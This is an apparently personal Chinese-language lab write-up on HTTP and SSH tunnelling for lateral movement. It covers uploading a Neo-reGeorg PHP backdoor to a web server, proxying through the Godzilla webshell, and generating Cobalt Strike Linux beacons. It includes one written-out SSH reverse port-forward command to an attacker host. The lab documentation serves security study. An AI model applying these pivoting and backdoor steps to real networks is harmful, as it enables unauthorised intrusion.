
# 隧道技术 http ssh

ssh目前只能通讯，不能上线，目前没有c2工具能利用ssh上线。     [192.168.2.11](http://192.168.2.11/) 192.168.139.222 都是web机。


## http:
http隧道上线一般意义不大，能通过http上线就能通过正反向上线

![1732609043452](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942064.png)

在情况1下，无法通过c2上线控制web机。因为入站只有web端口：80或者443，这两个端口都被占用，所以只能通过webshell工具来控制web机，而且也没有办法通过Web机控制sql，因为web的出站被限制。所以就需要通过隧道技术来实现让sql跟web机连接        这里是通过Web来建立隧道获取sql机上的有价值信息

  看防火墙配置，这里本机只能访问192.168.139.222       2.11 和 2.22 都访问不到     同一个网段好像可以不用看防火墙就能访问，不在同一个网段就得看防火墙策略。

eg: 192.168.139.1 可以访问192.168.139.2     如果192.168.139.2还有一个网段是192.168.2.2  那么192.168.139.1访问192.168.2.2 是访问不到的

![1732618408454](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942065.png)

![1732619300723](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942066.png)

  HTTP隧道搭建内网穿透    Neo-reGeorg-5.2.0工具使用说明，现在是用工具脚本创建一个socks代理。

![1732617986195](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942067.png)

这里将刚才用工具生成的php后门上传到可以通讯的web服务器192.168.139.222  上：

![1732618278013](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942068.png)

socks代理：

![1732618686942](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942069.png)

配置代理------Proxifier

![1732618847723](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942070.png)

然后就访问成功：

![1732619184404](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942071.png)

隧道实现成功

  哥斯拉，冰鞋；冰鞋：本机用隧道技术实现将目标端口（sql）80转发到本地端口2222上，先在本地上线到可以通讯的web机上，然后在信息收集到sql机，利用内网穿透，隧道技术实现

冰鞋复现失败，虚拟机问题：

![1732624362316](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942072.png)

   哥斯拉

端口映射，本地访问远程端口数据 主动转发出来  建立socks代理，连接socks对内网穿透

这里关闭刚才的socks和Proxifier代理：

![1732624587566](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942073.png)

然后哥斯拉连接上web，使用httpProxy：

##### ![1732624748652](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942074.png)

配置代理，访问192.168.2.22   成功

![1732624869350](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942075.png)

  上线c2

http一般不用来上线，http能上线的话，那么正反向也可以用来上线，一般都会用正反向来实现上线。http隧道一般用来信息收集，主要还是因为http在tcp层。

   ssh

​    首先是被控机跟目标机之间能通讯、让被控机(kali2)将内网机(sql)的80端口流量转发到攻击机(kali)上的1234端口，这里就是攻击机访问自己的1234端口，就等于被控机访问内网机的80端口。不过这里需要配置好环境，在腾讯文档中                                                                                           		ssh -CfNg -R 攻击机端口:内网目标机IP:80 root@攻击机ip                     

  	cs工具默认不支持linux mac  ios andior等这些机器上线，这里需要用到插件才支持这些操作系统上线，用插件生成后门文件后上传到目标系统机上执行。

先将两个文件上传到cs服务器，在向cs里导入脚本：

![1732625412067](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942076.png)

配置生成：

![1732625591959](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942077.png)

在事件日志这儿会有生成后门文件的命令：

![1732625633943](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942078.png)

生成后门，这里是生成的linux系统的上线文件：

![1732625793578](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942079.png)

执行上线文件，成功linux系统（kali ）上线：

![1732625831874](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942080.png)
